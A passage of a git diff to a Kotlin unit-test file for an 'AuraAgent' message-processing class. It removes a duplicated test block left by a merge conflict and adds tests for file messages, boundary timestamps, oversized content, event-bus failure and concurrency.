-            content = "Success message",
-            timestamp = System.currentTimeMillis()
-        )
-
-        val errorMessage = AgentMessage(
-            id = "error-001",
-            type = MessageType.TEXT,
-            content = "Error message",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(successMessage)).thenReturn(
-            AgentResponse(
-                messageId = successMessage.id,
-                content = "Success",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-        whenever(mockMessageHandler.processMessage(errorMessage)).thenThrow(
-            RuntimeException("Processing failed")
-        )
-
-        // When
-        auraAgent.processMessage(successMessage)
-        auraAgent.processMessage(errorMessage)
-
-        // Then
-        val eventCaptor = argumentCaptor<AgentEvent>()
-        verify(mockEventBus, times(2)).publish(eventCaptor.capture())
-
-        val events = eventCaptor.allValues
-        assertTrue(events.any { it.type == EventType.MESSAGE_PROCESSED })
-        assertTrue(events.any { it.type == EventType.MESSAGE_PROCESSING_FAILED })
-    }
-}
-
-@Nested
-@DisplayName("Configuration Edge Cases Tests")
-inner class ConfigurationEdgeCasesTests {
-
-    @Test
-    @DisplayName("Should handle configuration with extremely high max concurrent tasks")
-    fun shouldHandleConfigurationWithExtremelyHighMaxConcurrentTasks() = runTest {
-        // Given
-        val extremeConfig = AgentConfiguration(
-            name = "ExtremeAgent",
-            version = "1.0.0",
-            capabilities = listOf("CHAT"),
-            maxConcurrentTasks = Int.MAX_VALUE
-        )
-
-        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(extremeConfig)
-
-        // When
-        val agent = AuraAgent(mockAgentContext)
-
-        // Then
-        assertNotNull(agent)
-        assertTrue(agent.getMaxConcurrentTasks() <= 1000) // Should be capped at reasonable limit
-    }
-
-    @Test
-    @DisplayName("Should handle configuration with zero max concurrent tasks")
-    fun shouldHandleConfigurationWithZeroMaxConcurrentTasks() = runTest {
-        // Given
-        val zeroConfig = AgentConfiguration(
-            name = "ZeroAgent",
-            version = "1.0.0",
-            capabilities = listOf("CHAT"),
-            maxConcurrentTasks = 0
-        )
-
-        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(zeroConfig)
-
-        // When
-        val agent = AuraAgent(mockAgentContext)
-
-        // Then
-        assertNotNull(agent)
-        assertTrue(agent.getMaxConcurrentTasks() >= 1) // Should default to at least 1
-    }
-
-    @Test
-    @DisplayName("Should handle configuration with duplicate capabilities")
-    fun shouldHandleConfigurationWithDuplicateCapabilities() = runTest {
-        // Given
-        val duplicateConfig = AgentConfiguration(
-            name = "DuplicateAgent",
-            version = "1.0.0",
-            capabilities = listOf("CHAT", "CHAT", "ANALYSIS", "CHAT"),
-            maxConcurrentTasks = 5
-        )
-
-        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(duplicateConfig)
-
-        // When
-        val agent = AuraAgent(mockAgentContext)
-
-        // Then
-        assertNotNull(agent)
-        val capabilities = agent.getCapabilities()
-        assertEquals(2, capabilities.size) // Should deduplicate
-        assertTrue(capabilities.contains("CHAT"))
-        assertTrue(capabilities.contains("ANALYSIS"))
-    }
-
-    @Test
-    @DisplayName("Should handle configuration with empty version string")
-    fun shouldHandleConfigurationWithEmptyVersionString() = runTest {
-        // Given
-        val emptyVersionConfig = AgentConfiguration(
-            name = "EmptyVersionAgent",
-            version = "",
-            capabilities = listOf("CHAT"),
-            maxConcurrentTasks = 5
-        )
-
-        whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(emptyVersionConfig)
-
-        // When
-        val agent = AuraAgent(mockAgentContext)
-
-        // Then
-        assertNotNull(agent)
-        assertFalse(agent.getVersion().isEmpty()) // Should have default version
-    }
-}
-
-@Nested
-@DisplayName("Capability Edge Cases Tests")
-inner class CapabilityEdgeCasesTests {
-
-    @Test
-    @DisplayName("Should handle capability check with whitespace")
-    fun shouldHandleCapabilityCheckWithWhitespace() {
-        // Given
-        val capabilityWithSpaces = " CHAT "
-
-        // When
-        val hasCapability = auraAgent.hasCapability(capabilityWithSpaces)
-
-        // Then
-        assertTrue(hasCapability) // Should trim whitespace
-    }
-
-    @Test
-    @DisplayName("Should handle case-insensitive capability checks")
-    fun shouldHandleCaseInsensitiveCapabilityChecks() {
-        // Given
-        val lowerCaseCapability = "chat"
-        val upperCaseCapability = "CHAT"
-        val mixedCaseCapability = "ChAt"
-
-        // When
-        val hasLowerCase = auraAgent.hasCapability(lowerCaseCapability)
-        val hasUpperCase = auraAgent.hasCapability(upperCaseCapability)
-        val hasMixedCase = auraAgent.hasCapability(mixedCaseCapability)
-
-        // Then
-        assertTrue(hasLowerCase)
-        assertTrue(hasUpperCase)
-        assertTrue(hasMixedCase)
-    }
-
-    @Test
-    @DisplayName("Should handle capability check with special characters")
-    fun shouldHandleCapabilityCheckWithSpecialCharacters() {
-        // Given
-        val specialCapability = "CHAT@#$%"
-
-        // When
-        val hasCapability = auraAgent.hasCapability(specialCapability)
-
-        // Then
-        assertFalse(hasCapability)
-    }
-
-    @Test
-    @DisplayName("Should return immutable capabilities list")
-    fun shouldReturnImmutableCapabilitiesList() {
-        // When
-        val capabilities = auraAgent.getCapabilities()
-
-        // Then
-        assertFailsWith<UnsupportedOperationException> {
-            capabilities.add("NEW_CAPABILITY")
-        }
-    }
-}
-
-@Nested
-@DisplayName("Thread Safety Tests")
-inner class ThreadSafetyTests {
-
-    @Test
-    @DisplayName("Should handle concurrent start and stop operations safely")
-    fun shouldHandleConcurrentStartAndStopOperationsSafely() = runTest {
-        // Given
-        val latch = CountDownLatch(10)
-        val threads = mutableListOf<Thread>()
-
-        // When
-        repeat(10) { index ->
-            val thread = Thread {
-                try {
-                    if (index % 2 == 0) {
-                        auraAgent.start()
-                    } else {
-                        auraAgent.stop()
-                    }
-                } finally {
-                    latch.countDown()
-                }
+        @Test
+        @DisplayName("Should handle high-frequency message processing")
+        fun shouldHandleHighFrequencyMessageProcessing() = runTest {
+            // Given
+            val messages = (1..1000).map { index ->
+                AgentMessage(
+                    id = "rapid-$index",
+                    type = MessageType.TEXT,
+                    content = "Rapid message $index",
+                    timestamp = System.currentTimeMillis()
+                )
             }
-            threads.add(thread)
-            thread.start()
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+                AgentResponse(
+                    messageId = "test",
+                    content = "Processed",
+                    status = ResponseStatus.SUCCESS
+                )
+            )
+
+            // When
+            val startTime = System.currentTimeMillis()
+            val responses = messages.map { message ->
+                auraAgent.processMessage(message)
+            }
+            val endTime = System.currentTimeMillis()
+
+            // Then
+            assertEquals(1000, responses.size)
+            assertTrue(responses.all { it.status == ResponseStatus.SUCCESS })
+            assertTrue(endTime - startTime < 5000, "Should process 1000 messages within 5 seconds")
         }
-
-        latch.await(5, TimeUnit.SECONDS)
-
-        // Then
-        // Agent should be in a consistent state
-        assertTrue(auraAgent.isInitialized())
-        // No exceptions should be thrown
     }
 
-    @Test
-    @DisplayName("Should handle concurrent configuration updates safely")
-    fun shouldHandleConcurrentConfigurationUpdatesSafely() = runTest {
-        // Given
-        val configs = listOf(
-            AgentConfiguration("Agent1", "1.0.0", listOf("CHAT"), 5),
-            AgentConfiguration("Agent2", "2.0.0", listOf("ANALYSIS"), 10),
-            AgentConfiguration("Agent3", "3.0.0", listOf("TRANSLATION"), 15)
-        )
-
-        val latch = CountDownLatch(3)
-
-        // When
-        configs.forEach { config ->
-            Thread {
-                try {
-                    whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(config)
-                    auraAgent.handleConfigurationChanged()
-                } finally {
-                    latch.countDown()
-                }
-            }.start()
-        }
-
-        latch.await(5, TimeUnit.SECONDS)
-
-        // Then
-        // Agent should be in a consistent state with one of the configurations
-        assertTrue(auraAgent.isInitialized())
-        assertNotNull(auraAgent.getName())
-        assertNotNull(auraAgent.getVersion())
-    }
-}
-
-@Nested
-@DisplayName("Resource Management Edge Cases Tests")
-inner class ResourceManagementEdgeCasesTests {
-
-    @Test
-    @DisplayName("Should handle resource cleanup during shutdown")
-    fun shouldHandleResourceCleanupDuringShutdown() = runTest {
-        // Given
-        auraAgent.start()
-
-        // Process some messages to create resources
-        val messages = (1..5).map { index ->
-            AgentMessage(
-                id = "cleanup-$index",
-                type = MessageType.TEXT,
-                content = "Cleanup message $index",
-                timestamp = System.currentTimeMillis()
-            )
-        }
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = "test",
-                content = "Processed",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        messages.forEach { message ->
-            auraAgent.processMessage(message)
-        }
-
-        // When
-        auraAgent.shutdown()
-
-        // Then
-        assertTrue(auraAgent.isShutdown())
-        assertEquals(0, auraAgent.getActiveTaskCount())
-        assertTrue(auraAgent.getResourceUsage().memoryUsage < 1024 * 1024)
-    }
-
-    @Test
-    @DisplayName("Should handle memory pressure gracefully")
-    fun shouldHandleMemoryPressureGracefully() = runTest {
-        // Given
-        val largeMessages = (1..100).map { index ->
-            AgentMessage(
-                id = "large-$index",
-                type = MessageType.TEXT,
-                content = "x".repeat(100000), // 100KB each
-                timestamp = System.currentTimeMillis()
-            )
-        }
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = "test",
-                content = "Processed",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        largeMessages.forEach { message ->
-            auraAgent.processMessage(message)
-        }
-
-        // Then
-        // Agent should still be functional
-        assertTrue(auraAgent.isInitialized())
-        assertEquals(0, auraAgent.getActiveTaskCount())
-    }
-}
-
-@Nested
-@DisplayName("Integration-Style Tests")
-inner class IntegrationStyleTests {
-
-    @Test
-    @DisplayName("Should handle complete message lifecycle")
-    fun shouldHandleCompleteMessageLifecycle() = runTest {
-        // Given
-        val message = AgentMessage(
-            id = "lifecycle-001",
-            type = MessageType.TEXT,
-            content = "Complete lifecycle test",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = message.id,
-                content = "Lifecycle complete",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        auraAgent.start()
-        val response = auraAgent.processMessage(message)
-        auraAgent.stop()
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.SUCCESS, response.status)
-
-        // Verify complete interaction chain
-        verify(mockMessageHandler).validateMessage(message)
-        verify(mockMessageHandler).processMessage(message)
-        verify(mockEventBus).publish(argThat { event ->
-            event.type == EventType.MESSAGE_PROCESSED
-        })
-    }
-
-    @Test
-    @DisplayName("Should handle agent restart scenario")
-    fun shouldHandleAgentRestartScenario() = runTest {
-        // Given
-        val message = AgentMessage(
-            id = "restart-001",
-            type = MessageType.TEXT,
-            content = "Restart test",
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = message.id,
-                content = "Restart response",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        auraAgent.start()
-        auraAgent.processMessage(message)
-        auraAgent.stop()
-
-        // Restart
-        auraAgent.start()
-        val response = auraAgent.processMessage(message)
-        auraAgent.stop()
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.SUCCESS, response.status)
-
-        // Verify agent can be restarted successfully
-        verify(mockEventBus, times(2)).publish(argThat { event ->
-            event.type == EventType.AGENT_STARTED
-        })
-        verify(mockEventBus, times(2)).publish(argThat { event ->
-            event.type == EventType.AGENT_STOPPED
-        })
-    }
-}
-
-@Nested
-@DisplayName("Boundary Value Tests")
-inner class BoundaryValueTests {
-
-    @Test
-    @DisplayName("Should handle message at exact character limit")
-    fun shouldHandleMessageAtExactCharacterLimit() = runTest {
-        // Given
-        val maxLength = 65536 // Assuming 64KB limit
-        val exactLimitMessage = AgentMessage(
-            id = "limit-001",
-            type = MessageType.TEXT,
-            content = "x".repeat(maxLength),
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = exactLimitMessage.id,
-                content = "Processed at limit",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        val response = auraAgent.processMessage(exactLimitMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.SUCCESS, response.status)
-    }
-
-    @Test
-    @DisplayName("Should handle message exceeding character limit")
-    fun shouldHandleMessageExceedingCharacterLimit() = runTest {
-        // Given
-        val oversizedMessage = AgentMessage(
-            id = "oversized-001",
-            type = MessageType.TEXT,
-            content = "x".repeat(1000000), // 1MB
-            timestamp = System.currentTimeMillis()
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-
-        // When
-        val response = auraAgent.processMessage(oversizedMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
-    }
-
-    @Test
-    @DisplayName("Should handle minimum valid timestamp")
-    fun shouldHandleMinimumValidTimestamp() = runTest {
-        // Given
-        val minTimestampMessage = AgentMessage(
-            id = "min-timestamp-001",
-            type = MessageType.TEXT,
-            content = "Minimum timestamp test",
-            timestamp = 1L
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
-        whenever(mockMessageHandler.processMessage(any())).thenReturn(
-            AgentResponse(
-                messageId = minTimestampMessage.id,
-                content = "Processed min timestamp",
-                status = ResponseStatus.SUCCESS
-            )
-        )
-
-        // When
-        val response = auraAgent.processMessage(minTimestampMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.SUCCESS, response.status)
-    }
-
-    @Test
-    @DisplayName("Should handle maximum valid timestamp")
-    fun shouldHandleMaximumValidTimestamp() = runTest {
-        // Given
-        val maxTimestampMessage = AgentMessage(
-            id = "max-timestamp-001",
-            type = MessageType.TEXT,
-            content = "Maximum timestamp test",
-            timestamp = Long.MAX_VALUE
-        )
-
-        whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-
-        // When
-        val response = auraAgent.processMessage(maxTimestampMessage)
-
-        // Then
-        assertNotNull(response)
-        assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
-    }
-}
-=======
     @Nested
     @DisplayName("Message Type Handling Tests")
     inner class MessageTypeHandlingTests {
@@ -2013,7 +1073,7 @@ inner class BoundaryValueTests {
                 content = "/help",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2022,10 +1082,10 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             val response = auraAgent.processMessage(commandMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.SUCCESS, response.status)
@@ -2042,7 +1102,7 @@ inner class BoundaryValueTests {
                 content = "What is the weather today?",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2051,10 +1111,10 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             val response = auraAgent.processMessage(queryMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.SUCCESS, response.status)
@@ -2070,15 +1130,15 @@ inner class BoundaryValueTests {
                 content = "Binary data",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenThrow(
                 UnsupportedOperationException("Binary messages not supported")
             )
-            
+
             // When
             val response = auraAgent.processMessage(unsupportedMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.ERROR, response.status)
@@ -2095,15 +1155,44 @@ inner class BoundaryValueTests {
                 content = "Message with null type",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-            
+
             // When
             val response = auraAgent.processMessage(nullTypeMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+        }
+
+        @Test
+        @DisplayName("Should handle FILE message type correctly")
+        fun shouldHandleFileMessageTypeCorrectly() = runTest {
+            // Given
+            val fileMessage = AgentMessage(
+                id = "file-001",
+                type = MessageType.FILE,
+                content = "file://path/to/document.pdf",
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+                AgentResponse(
+                    messageId = fileMessage.id,
+                    content = "File processed successfully",
+                    status = ResponseStatus.SUCCESS
+                )
+            )
+
+            // When
+            val response = auraAgent.processMessage(fileMessage)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.SUCCESS, response.status)
+            assertTrue(response.content.contains("File processed"))
         }
     }
 
@@ -2121,7 +1210,7 @@ inner class BoundaryValueTests {
                 content = "Hello! @#$%^&*()_+-=[]{}|;':\",./<>?",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2130,10 +1219,10 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             val response = auraAgent.processMessage(specialMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.SUCCESS, response.status)
@@ -2149,7 +1238,7 @@ inner class BoundaryValueTests {
                 content = "Hello 世界! 🌍 Café naïve résumé",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2158,10 +1247,10 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             val response = auraAgent.processMessage(unicodeMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.SUCCESS, response.status)
@@ -2178,12 +1267,12 @@ inner class BoundaryValueTests {
                 content = "Message with very long ID",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-            
+
             // When
             val response = auraAgent.processMessage(longIdMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
@@ -2199,15 +1288,59 @@ inner class BoundaryValueTests {
                 content = "Message from the future",
                 timestamp = System.currentTimeMillis() + 1000000
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
-            
+
             // When
             val response = auraAgent.processMessage(futureMessage)
-            
+
             // Then
             assertNotNull(response)
             assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+        }
+
+        @Test
+        @DisplayName("Should handle message with negative timestamp")
+        fun shouldHandleMessageWithNegativeTimestamp() = runTest {
+            // Given
+            val negativeTimestampMessage = AgentMessage(
+                id = "negative-001",
+                type = MessageType.TEXT,
+                content = "Negative timestamp test",
+                timestamp = -1L
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
+
+            // When
+            val response = auraAgent.processMessage(negativeTimestampMessage)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+        }
+
+        @Test
+        @DisplayName("Should handle message with extremely large content")
+        fun shouldHandleMessageWithExtremelyLargeContent() = runTest {
+            // Given
+            val largeContent = "x".repeat(10 * 1024 * 1024) // 10MB content
+            val largeMessage = AgentMessage(
+                id = "large-001",
+                type = MessageType.TEXT,
+                content = largeContent,
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(false)
+
+            // When
+            val response = auraAgent.processMessage(largeMessage)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.VALIDATION_ERROR, response.status)
+            assertTrue(response.content.contains("size"))
         }
     }
 
@@ -2227,7 +1360,7 @@ inner class BoundaryValueTests {
                     timestamp = System.currentTimeMillis()
                 )
             }
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2236,12 +1369,12 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             // When
             messages.forEach { message ->
                 auraAgent.processMessage(message)
             }
-            
+
             // Then
             verify(mockEventBus, times(100)).publish(any())
         }
@@ -2252,7 +1385,7 @@ inner class BoundaryValueTests {
             // Given
             doThrow(RuntimeException("Subscription failed"))
                 .whenever(mockEventBus).subscribe(any(), any())
-            
+
             // When & Then
             assertDoesNotThrow {
                 AuraAgent(mockAgentContext)
@@ -2269,14 +1402,14 @@ inner class BoundaryValueTests {
                 content = "Success message",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             val errorMessage = AgentMessage(
                 id = "error-001",
                 type = MessageType.TEXT,
                 content = "Error message",
                 timestamp = System.currentTimeMillis()
             )
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(successMessage)).thenReturn(
                 AgentResponse(
@@ -2288,18 +1421,50 @@ inner class BoundaryValueTests {
             whenever(mockMessageHandler.processMessage(errorMessage)).thenThrow(
                 RuntimeException("Processing failed")
             )
-            
+
             // When
             auraAgent.processMessage(successMessage)
             auraAgent.processMessage(errorMessage)
-            
+
             // Then
             val eventCaptor = argumentCaptor<AgentEvent>()
             verify(mockEventBus, times(2)).publish(eventCaptor.capture())
-            
+
             val events = eventCaptor.allValues
             assertTrue(events.any { it.type == EventType.MESSAGE_PROCESSED })
             assertTrue(events.any { it.type == EventType.MESSAGE_PROCESSING_FAILED })
+        }
+
+        @Test
+        @DisplayName("Should handle event bus disconnection gracefully")
+        fun shouldHandleEventBusDisconnectionGracefully() = runTest {
+            // Given
+            val message = AgentMessage(
+                id = "disconnect-001",
+                type = MessageType.TEXT,
+                content = "Disconnection test",
+                timestamp = System.currentTimeMillis()
+            )
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+                AgentResponse(
+                    messageId = message.id,
+                    content = "Processed",
+                    status = ResponseStatus.SUCCESS
+                )
+            )
+
+            // Simulate event bus disconnection
+            doThrow(RuntimeException("Event bus disconnected"))
+                .whenever(mockEventBus).publish(any())
+
+            // When
+            val response = auraAgent.processMessage(message)
+
+            // Then
+            assertNotNull(response)
+            assertEquals(ResponseStatus.SUCCESS, response.status)
         }
     }
 
@@ -2317,12 +1482,12 @@ inner class BoundaryValueTests {
                 capabilities = listOf("CHAT"),
                 maxConcurrentTasks = Int.MAX_VALUE
             )
-            
+
             whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(extremeConfig)
-            
+
             // When
             val agent = AuraAgent(mockAgentContext)
-            
+
             // Then
             assertNotNull(agent)
             assertTrue(agent.getMaxConcurrentTasks() <= 1000) // Should be capped at reasonable limit
@@ -2338,12 +1503,12 @@ inner class BoundaryValueTests {
                 capabilities = listOf("CHAT"),
                 maxConcurrentTasks = 0
             )
-            
+
             whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(zeroConfig)
-            
+
             // When
             val agent = AuraAgent(mockAgentContext)
-            
+
             // Then
             assertNotNull(agent)
             assertTrue(agent.getMaxConcurrentTasks() >= 1) // Should default to at least 1
@@ -2359,12 +1524,12 @@ inner class BoundaryValueTests {
                 capabilities = listOf("CHAT", "CHAT", "ANALYSIS", "CHAT"),
                 maxConcurrentTasks = 5
             )
-            
+
             whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(duplicateConfig)
-            
+
             // When
             val agent = AuraAgent(mockAgentContext)
-            
+
             // Then
             assertNotNull(agent)
             val capabilities = agent.getCapabilities()
@@ -2383,77 +1548,36 @@ inner class BoundaryValueTests {
                 capabilities = listOf("CHAT"),
                 maxConcurrentTasks = 5
             )
-            
+
             whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(emptyVersionConfig)
-            
+
             // When
             val agent = AuraAgent(mockAgentContext)
-            
+
             // Then
             assertNotNull(agent)
             assertFalse(agent.getVersion().isEmpty()) // Should have default version
         }
-    }
-
-    @Nested
-    @DisplayName("Capability Edge Cases Tests")
-    inner class CapabilityEdgeCasesTests {
 
         @Test
-        @DisplayName("Should handle capability check with whitespace")
-        fun shouldHandleCapabilityCheckWithWhitespace() {
+        @DisplayName("Should handle configuration with null capabilities list")
+        fun shouldHandleConfigurationWithNullCapabilitiesList() = runTest {
             // Given
-            val capabilityWithSpaces = " CHAT "
-            
-            // When
-            val hasCapability = auraAgent.hasCapability(capabilityWithSpaces)
-            
-            // Then
-            assertTrue(hasCapability) // Should trim whitespace
-        }
+            val nullCapabilitiesConfig = AgentConfiguration(
+                name = "NullCapabilitiesAgent",
+                version = "1.0.0",
+                capabilities = null,
+                maxConcurrentTasks = 5
+            )
 
-        @Test
-        @DisplayName("Should handle case-insensitive capability checks")
-        fun shouldHandleCaseInsensitiveCapabilityChecks() {
-            // Given
-            val lowerCaseCapability = "chat"
-            val upperCaseCapability = "CHAT"
-            val mixedCaseCapability = "ChAt"
-            
-            // When
-            val hasLowerCase = auraAgent.hasCapability(lowerCaseCapability)
-            val hasUpperCase = auraAgent.hasCapability(upperCaseCapability)
-            val hasMixedCase = auraAgent.hasCapability(mixedCaseCapability)
-            
-            // Then
-            assertTrue(hasLowerCase)
-            assertTrue(hasUpperCase)
-            assertTrue(hasMixedCase)
-        }
+            whenever(mockConfigurationProvider.getAgentConfiguration()).thenReturn(nullCapabilitiesConfig)
 
-        @Test
-        @DisplayName("Should handle capability check with special characters")
-        fun shouldHandleCapabilityCheckWithSpecialCharacters() {
-            // Given
-            val specialCapability = "CHAT@#$%"
-            
             // When
-            val hasCapability = auraAgent.hasCapability(specialCapability)
-            
-            // Then
-            assertFalse(hasCapability)
-        }
+            val agent = AuraAgent(mockAgentContext)
 
-        @Test
-        @DisplayName("Should return immutable capabilities list")
-        fun shouldReturnImmutableCapabilitiesList() {
-            // When
-            val capabilities = auraAgent.getCapabilities()
-            
             // Then
-            assertFailsWith<UnsupportedOperationException> {
-                capabilities.add("NEW_CAPABILITY")
-            }
+            assertNotNull(agent)
+            assertTrue(agent.getCapabilities().isEmpty())
         }
     }
 
@@ -2467,7 +1591,7 @@ inner class BoundaryValueTests {
             // Given
             val latch = CountDownLatch(10)
             val threads = mutableListOf<Thread>()
-            
+
             // When
             repeat(10) { index ->
                 val thread = Thread {
@@ -2484,9 +1608,9 @@ inner class BoundaryValueTests {
                 threads.add(thread)
                 thread.start()
             }
-            
+
             latch.await(5, TimeUnit.SECONDS)
-            
+
             // Then
             // Agent should be in a consistent state
             assertTrue(auraAgent.isInitialized())
@@ -2502,9 +1626,9 @@ inner class BoundaryValueTests {
                 AgentConfiguration("Agent2", "2.0.0", listOf("ANALYSIS"), 10),
                 AgentConfiguration("Agent3", "3.0.0", listOf("TRANSLATION"), 15)
             )
-            
+
             val latch = CountDownLatch(3)
-            
+
             // When
             configs.forEach { config ->
                 Thread {
@@ -2516,14 +1640,57 @@ inner class BoundaryValueTests {
                     }
                 }.start()
             }
-            
+
             latch.await(5, TimeUnit.SECONDS)
-            
+
             // Then
             // Agent should be in a consistent state with one of the configurations
             assertTrue(auraAgent.isInitialized())
             assertNotNull(auraAgent.getName())
             assertNotNull(auraAgent.getVersion())
+        }
+
+        @Test
+        @DisplayName("Should handle concurrent message processing safely")
+        fun shouldHandleConcurrentMessageProcessingSafely() = runTest {
+            // Given
+            val messages = (1..50).map { index ->
+                AgentMessage(
+                    id = "concurrent-$index",
+                    type = MessageType.TEXT,
+                    content = "Concurrent message $index",
+                    timestamp = System.currentTimeMillis()
+                )
+            }
+
+            whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
+            whenever(mockMessageHandler.processMessage(any())).thenReturn(
+                AgentResponse(
+                    messageId = "test",
+                    content = "Processed",
+                    status = ResponseStatus.SUCCESS
+                )
+            )
+
+            val latch = CountDownLatch(50)
+
+            // When
+            messages.forEach { message ->
+                Thread {
+                    try {
+                        auraAgent.processMessage(message)
+                    } finally {
+                        latch.countDown()
+                    }
+                }.start()
+            }
+
+            latch.await(10, TimeUnit.SECONDS)
+
+            // Then
+            // All messages should be processed without race conditions
+            verify(mockMessageHandler, times(50)).validateMessage(any())
+            verify(mockMessageHandler, times(50)).processMessage(any())
         }
     }
 
@@ -2536,7 +1703,7 @@ inner class BoundaryValueTests {
         fun shouldHandleResourceCleanupDuringShutdown() = runTest {
             // Given
             auraAgent.start()
-            
+
             // Process some messages to create resources
             val messages = (1..5).map { index ->
                 AgentMessage(
@@ -2546,7 +1713,7 @@ inner class BoundaryValueTests {
                     timestamp = System.currentTimeMillis()
                 )
             }
-            
+
             whenever(mockMessageHandler.validateMessage(any())).thenReturn(true)
             whenever(mockMessageHandler.processMessage(any())).thenReturn(
                 AgentResponse(
@@ -2555,14 +1722,14 @@ inner class BoundaryValueTests {
                     status = ResponseStatus.SUCCESS
                 )
             )
-            
+
             messages.forEach { message ->
                 auraAgent.processMessage(message)
             }
-            
+
             // When
